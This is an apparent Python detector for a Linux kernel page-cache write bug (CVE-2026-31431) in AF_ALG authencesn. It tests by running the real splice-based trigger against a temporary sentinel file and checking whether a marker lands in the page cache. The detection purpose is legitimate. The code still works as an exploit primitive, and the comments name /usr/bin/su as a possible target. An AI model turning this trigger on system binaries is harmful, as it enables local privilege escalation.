#!/usr/bin/env python3
# CVE-2026-31431 ("Copy Fail") vulnerability detector.
# Python 3.9-compatible port — os.splice() replaced with ctypes libc splice(2).
#
# Attempts to trigger the algif_aead / authencesn page-cache scratch-write
# primitive against a user-owned sentinel file in a temp directory. If the
# scratch write lands inside the spliced page-cache page, the file's contents
# (as observed via a fresh read) will contain the marker bytes.
#
# SAFE BY DESIGN
#   * Operates on a sentinel file the running user just created. /usr/bin/su
#     and other system binaries are NOT touched.
#   * Page-cache corruption is in-memory only; nothing is written back to disk.
#   * Exit 0 = NOT vulnerable, 2 = VULNERABLE, 1 = test error.
#
# Use only on hosts you own or are explicitly authorized to test.

import ctypes
import ctypes.util
import errno
import os
import socket
import struct
import sys
import tempfile

# ---------------------------------------------------------------------------
# ctypes splice(2) wrapper (replaces os.splice which needs Python 3.12)
# ---------------------------------------------------------------------------

_libc_name = ctypes.util.find_library("c") or "libc.so.6"
_libc = ctypes.CDLL(_libc_name, use_errno=True)

# ssize_t splice(int fd_in, loff_t *off_in,
#                int fd_out, loff_t *off_out,
#                size_t len, unsigned int flags);
_libc.splice.restype  = ctypes.c_ssize_t
_libc.splice.argtypes = [
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_int64),
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_int64),
    ctypes.c_size_t,
    ctypes.c_uint,
]

SPLICE_F_MOVE = 1


def _splice(fd_in, fd_out, length, offset_src=None):
    """Thin wrapper around libc splice(2).

    offset_src=None  → pass NULL (use current file position, advances it).
    offset_src=N     → pass pointer to N (file position is NOT advanced).
    Returns number of bytes transferred; raises OSError on failure.
    """
    if offset_src is None:
        p_off_in = None
    else:
        _off = ctypes.c_int64(offset_src)
        p_off_in = ctypes.byref(_off)

    n = _libc.splice(fd_in, p_off_in, fd_out, None, length, 0)
    if n < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return n


# ---------------------------------------------------------------------------
# AF_ALG constants
# ---------------------------------------------------------------------------

AF_ALG                    = 38
SOL_ALG                   = 279
ALG_SET_KEY               = 1
ALG_SET_IV                = 2
ALG_SET_OP                = 3
ALG_SET_AEAD_ASSOCLEN     = 4
ALG_OP_DECRYPT            = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PAGE     = 4096
ASSOCLEN = 8
CRYPTLEN = 16
TAGLEN   = 16
MARKER   = b"PWND"


def build_authenc_keyblob(authkey: bytes, enckey: bytes) -> bytes:
    rtattr   = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey


def precheck():
    if not os.path.exists("/proc/crypto"):
        return "/proc/crypto missing"
    try:
        socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0).close()
    except OSError as e:
        return f"AF_ALG socket family unavailable ({e.strerror})"
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", ALG_NAME))
        s.close()
    except OSError as e:
        return f"{ALG_NAME!r} cannot be instantiated ({e.strerror})"
    return None


def attempt_trigger(target_path):
    sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!!\n" * (PAGE // 32))[:PAGE]
    with open(target_path, "wb") as f:
        f.write(sentinel)

    # Populate page cache.
    fd_target = os.open(target_path, os.O_RDONLY)
    os.read(fd_target, PAGE)
    os.lseek(fd_target, 0, os.SEEK_SET)

    # Master socket: bind + key.
    master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    master.bind(("aead", ALG_NAME))
    master.setsockopt(
        SOL_ALG, ALG_SET_KEY,
        build_authenc_keyblob(b"\x00" * 32, b"\x00" * 16),
    )
    op, _ = master.accept()

    aad = b"\x00" * 4 + MARKER
    cmsg = [
        (SOL_ALG, ALG_SET_OP,            struct.pack("I", ALG_OP_DECRYPT)),
        (SOL_ALG, ALG_SET_IV,            struct.pack("I", 16) + b"\x00" * 16),
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", ASSOCLEN)),
    ]
    op.sendmsg([aad], cmsg, socket.MSG_MORE)

    pr, pw = os.pipe()
    try:
        # file -> pipe  (offset 0, uses ctypes splice)
        n = _splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
        if n != CRYPTLEN + TAGLEN:
            raise RuntimeError(f"splice file->pipe short: {n}")
        # pipe -> AF_ALG op socket  (no offset = consume pipe)
        n = _splice(pr, op.fileno(), n)
        if n != CRYPTLEN + TAGLEN:
            raise RuntimeError(f"splice pipe->op short: {n}")
    except OSError as e:
        os.close(pr); os.close(pw)
        op.close(); master.close(); os.close(fd_target)
        if e.errno in (errno.EOPNOTSUPP, getattr(errno, "ENOTSUP", errno.EOPNOTSUPP)):
            raise RuntimeError(
                "splice into AF_ALG socket not supported on this kernel - "
                "the page-cache attack vector is not reachable here"
            ) from e
        raise

    try:
        op.recv(ASSOCLEN + CRYPTLEN + TAGLEN)
    except OSError as e:
        if e.errno not in (errno.EBADMSG, errno.EINVAL):
            raise

    op.close()
    master.close()
    os.close(pr)
    os.close(pw)

    os.lseek(fd_target, 0, os.SEEK_SET)
    after = os.read(fd_target, PAGE)
    os.close(fd_target)

    return after, sentinel


def kernel_in_affected_line():
    rel = os.uname().release.split("-")[0]
    parts = rel.split(".")
    try:
        major, minor = int(parts[0]), int(parts[1])
    except (ValueError, IndexError):
        return False
    return (major, minor) >= (6, 12)


def main():
    print(f"[*] CVE-2026-31431 detector  kernel={os.uname().release}  "
          f"arch={os.uname().machine}")
    print(f"[*] Python {sys.version.split()[0]}  (ctypes splice wrapper)")

    if not kernel_in_affected_line():
        print(f"[i] Kernel {os.uname().release} predates the affected "
              f"6.12/6.17/6.18 lines; trigger may not apply even if "
              f"prerequisites match.")

    reason = precheck()
    if reason:
        print(f"[+] Precondition not met ({reason}). NOT vulnerable.")
        return 0
    print(f"[+] AF_ALG + {ALG_NAME!r} loadable - precondition met.")

    tmp = tempfile.mkdtemp(prefix="copyfail-")
    target = os.path.join(tmp, "sentinel.bin")
    try:
        after, sentinel = attempt_trigger(target)
    except Exception as e:
        print(f"[!] Trigger failed: {type(e).__name__}: {e}")
        return 1
    finally:
        try:
            os.remove(target)
            os.rmdir(tmp)
        except OSError:
            pass

    marker_off  = after.find(MARKER)
    marker_orig = sentinel.find(MARKER)
    diffs       = [i for i in range(PAGE) if after[i] != sentinel[i]]

    if marker_off >= 0 and marker_orig < 0:
        ctx = after[max(marker_off - 4, 0):marker_off + 12]
        print(f"[!] VULNERABLE to CVE-2026-31431.")
        print(f"[!]   Marker {MARKER!r} (AAD seqno_lo) landed in the spliced "
              f"page-cache page at offset {marker_off}.")
        print(f"[!]   Surrounding bytes: {ctx.hex()}  ({ctx!r})")
        print(f"[!] Apply the upstream fix or block algif_aead immediately.")
        return 2

    if diffs:
        first = diffs[0]
        window = after[first:first + 16]
        print(f"[!] Page cache MODIFIED via in-place AEAD splice path "
              f"({len(diffs)} bytes changed, first at offset {first}).")
        print(f"[!]   Window: {window.hex()}")
        print(f"[!]   The controllable scratch-write marker did not land, but "
              f"the kernel still allowed a page-cache page into the writable "
              f"AEAD destination scatterlist.")
        print(f"[!]   Treat as VULNERABLE to the underlying bug class until "
              f"a patched kernel is installed.")
        return 2

    print("[+] Page cache intact. NOT vulnerable on this kernel.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
